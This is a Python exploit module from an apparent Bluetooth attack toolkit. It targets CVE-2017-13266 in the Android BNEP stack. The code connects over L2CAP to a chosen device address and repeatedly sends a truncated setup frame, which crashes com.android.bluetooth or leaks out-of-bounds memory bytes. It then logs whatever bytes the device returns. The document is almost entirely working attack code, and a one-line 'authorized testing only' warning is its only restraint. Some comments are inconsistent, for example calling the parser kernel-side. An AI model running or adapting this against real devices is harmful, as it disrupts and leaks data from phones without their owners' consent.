"""
BlueSploit Module: Android BNEP Setup-Connection-Request OOB Read DoS
EDB-ID: 44327  /  CVE-2017-13266 (QuarksLab)

Sends a truncated BNEP control frame:
    [0x01 (FRAME_CONTROL)] [0x01 (SETUP_CONNECTION_REQUEST_MSG)]
without the expected `len` field. The Android Bluetooth stack reads the
missing length from out-of-bounds memory inside `bnep_process_control_packet()`
in bnep_utils.cc → crash or info disclosure of the OOB byte.

Companion to `bnep_heap_disclosure.py` (EDB-44326).
Pure passive RFCOMM/L2CAP transport, no auth required.
"""

import struct
import time
from core.base import (
    DosModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity,
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors,
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False


# BNEP constants
BNEP_PSM                          = 0x000F   # 15
BNEP_FRAME_CONTROL                = 0x01
BNEP_SETUP_CONNECTION_REQUEST_MSG = 0x01


# Affected Android versions
AFFECTED = [
    "Android 5.1.1, 6.0-6.0.1, 7.0-7.1.2, 8.0-8.1",
    "Patched in March 2018 Security Bulletin",
]


class Module(DosModule):
    """
    BNEP Setup-Connection OOB Read

    The BNEP receive path expects a 1-byte UUID-size field after the control
    type. By sending only [type, control] and stopping there, the parser
    reads the size from uninitialized stack memory and either crashes
    com.android.bluetooth or disclosures one OOB byte in the response.
    """

    info = ModuleInfo(
        name="dos/bnep_setup_oob_read",
        description="Android BNEP setup-connection-request OOB read DoS (EDB-44327)",
        author=["QuarksLab"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        cve=["CVE-2017-13266"],
        references=[
            "https://www.exploit-db.com/exploits/44327",
            "https://source.android.com/security/bulletin/2018-03-01",
        ],
    )

    def _setup_options(self) -> None:
        self.options = {
            "target": ModuleOption(
                name="target", required=True,
                description="Target BD_ADDR (Android < March 2018)",
            ),
            "src_bdaddr": ModuleOption(
                name="src_bdaddr", required=False, default="",
                description="Local source BD_ADDR (optional, pybluez auto-selects)",
            ),
            "count": ModuleOption(
                name="count", required=False, default=1,
                description="Number of malformed packets to send",
            ),
        }

    def _build_truncated_setup(self) -> bytes:
        # Just two bytes: BNEP_FRAME_CONTROL + BNEP_SETUP_CONNECTION_REQUEST_MSG
        # The kernel-side parser will read the next byte (UUID size) OOB.
        return struct.pack("<BB", BNEP_FRAME_CONTROL, BNEP_SETUP_CONNECTION_REQUEST_MSG)

    def run(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("Install pybluez2: pip install pybluez2")
            return False

        target = self.target
        src    = self.get_option("src_bdaddr") or ""
        count  = int(self.get_option("count"))

        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False

        C = Colors
        print(f"\n  {C.RED}╔{'═'*60}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET}  {C.BOLD}Android BNEP OOB Read DoS  CVE-2017-13266{C.RESET}         {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*60}╝{C.RESET}\n")
        print_info(f"Target : {target}  BNEP PSM 0x{BNEP_PSM:04X}")
        print_warning("Authorized testing only, may crash com.android.bluetooth")

        sock = None
        sent = 0
        oob_bytes = []
        try:
            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            sock.settimeout(5)
            if src:
                try:
                    sock.bind((src, 0))
                except Exception:
                    pass

            print_info("Connecting to BNEP...")
            sock.connect((target, BNEP_PSM))
            sock.settimeout(1)
            print_success("Connected")

            payload = self._build_truncated_setup()
            for i in range(count):
                sock.send(payload)
                sent += 1
                hex_str = " ".join(f"{b:02X}" for b in payload)
                print(f"  [{i+1}/{count}] sent {len(payload)} bytes  [{hex_str}]")
                try:
                    data = sock.recv(8)
                    if data:
                        # First reply byte is BNEP echo, OOB byte trails
                        oob_bytes.append(data.hex())
                        print(f"    response: {data.hex()}")
                    else:
                        print(f"    no response, target likely crashed")
                except bluetooth.btcommon.BluetoothError:
                    print(f"    no response, target likely crashed")
                except Exception:
                    pass
                time.sleep(0.2)

            print_success(f"Done. {sent} probe(s) sent.")

        except (OSError, IOError) as e:
            print_error(f"Connection error: {e}")
        except Exception as e:
            print_error(f"Error: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

        self.add_result({
            "target": target, "edb_id": 44327,
            "cve": "CVE-2017-13266",
            "packets_sent": sent,
            "responses": oob_bytes,
            "affected": AFFECTED,
        })
        return sent > 0
